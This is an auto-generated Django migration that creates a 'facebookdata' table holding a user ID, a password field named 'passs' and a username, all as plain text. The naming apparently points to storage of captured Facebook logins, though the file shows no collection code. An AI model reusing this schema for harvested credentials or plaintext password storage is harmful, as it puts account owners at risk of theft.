# Generated by Django 3.1.7 on 2021-03-22 13:43

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ('index', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='facebookdata',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('userid', models.CharField(max_length=1000000)),
                ('passs', models.CharField(max_length=500)),
                ('username', models.CharField(max_length=500)),
            ],
        ),
    ]